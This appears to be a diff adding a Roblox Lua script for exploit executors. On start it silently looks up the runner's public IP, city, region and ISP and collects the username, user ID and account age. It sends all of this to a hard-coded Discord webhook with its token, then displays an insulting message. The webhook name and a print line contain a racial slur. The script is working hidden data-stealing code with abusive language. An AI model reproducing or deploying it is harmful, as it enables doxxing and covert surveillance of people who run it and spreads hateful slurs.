@@ -1,0 +1,120 @@
+local HttpService = game:GetService("HttpService")
+local LocalizationService = game:GetService("LocalizationService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- === TU WEBHOOK (ya con proxy) ===
+local WebhookConfig = {
+    Enabled = true,
+    Url = "https://webhook.lewisakura.moe/api/webhooks/1549137752078164008/30EJxv_O5QMfqwyZWcd5hFYWCYxIaQmvmkNqgxaYAudIfBVrrWZQ_v8tTyChkE8mhhoW"
+}
+
+-- Función para mostrar notificación verde (edita el texto aquí)
+local function ShowGreenNotification(text)
+    local screenGui = playerGui:FindFirstChild("ScriptNotification") or Instance.new("ScreenGui")
+    screenGui.Name = "ScriptNotification"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 380, 0, 90)
+    frame.Position = UDim2.new(0.5, -190, 0, -120)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+    frame.BorderSizePixel = 0
+    frame.BackgroundTransparency = 0.05
+    frame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 14)
+    corner.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -24, 1, -24)
+    label.Position = UDim2.new(0, 12, 0, 12)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.TextStrokeTransparency = 0.8
+    label.Parent = frame
+
+    TweenService:Create(frame, TweenInfo.new(0.7, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -190, 0, 30)}):Play()
+
+    task.wait(4.5)
+    local fade = TweenService:Create(frame, TweenInfo.new(0.9), {Position = UDim2.new(0.5, -190, 0, -120), BackgroundTransparency = 1})
+    fade:Play()
+    fade.Completed:Connect(function() frame:Destroy() end)
+end
+
+-- Función para obtener IP y datos + enviar al Discord
+local function SendWebhookWithIP()
+    if not WebhookConfig.Enabled then return end
+
+    local country = "Desconocido"
+    pcall(function()
+        country = LocalizationService:GetCountryRegionForPlayerAsync(player)
+    end)
+
+    local accountAge = player.AccountAge
+    local approxDate = os.date("%d/%m/%Y", os.time() - accountAge * 86400)
+
+    -- Obtener IP y más info
+    local ipData = {
+        query = "Desconocido",
+        country = "Desconocido",
+        regionName = "Desconocido",
+        city = "Desconocido",
+        isp = "Desconocido"
+    }
+
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/?fields=query,country,regionName,city,isp")
+        ipData = HttpService:JSONDecode(response)
+    end)
+
+    local embed = {
+        title = "Home Of God",
+        description = "Alguien ejecutó tu script privado",
+        color = 0xFF0000,  -- Rojo para que destaque
+        fields = {
+            {name = "Usuario", value = "```"..player.Name.." ("..player.UserId..")```", inline = true},
+            {name = "IP", value = "```".. (ipData.query or "No disponible") .."```", inline = true},
+            {name = "País", value = "```".. (ipData.country or country) .."```", inline = true},
+            {name = "Región/Ciudad", value = "```".. (ipData.regionName or "N/A") .. " - " .. (ipData.city or "N/A") .."```", inline = false},
+            {name = "ISP", value = "```".. (ipData.isp or "Desconocido") .."```", inline = false},
+            {name = "Edad de cuenta", value = "```"..accountAge.." días```", inline = true},
+            {name = "Creada aprox.", value = "```"..approxDate.."```", inline = true},
+            {name = "Servidor", value = "```"..tostring(game.JobId).."```", inline = false}
+        },
+        footer = {text = "Logger Privado • "..os.date("%Y-%m-%d %H:%M:%S")}
+    }
+
+    local data = { 
+        username = "Nigger IP Logger",
+        embeds = {embed}
+    }
+
+    pcall(function()
+        local req = http_request or request or (syn and syn.request)
+        if req then
+            req({
+                Url = WebhookConfig.Url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+-- === AL INICIAR ===
+SendWebhookWithIP()
+
+-- ←←← EDITA AQUÍ EL TEXTO VERDE QUE VE EL JUGADOR ←←←
+ShowGreenNotification("Fuck you")
+
+print("Fuck Nigger")
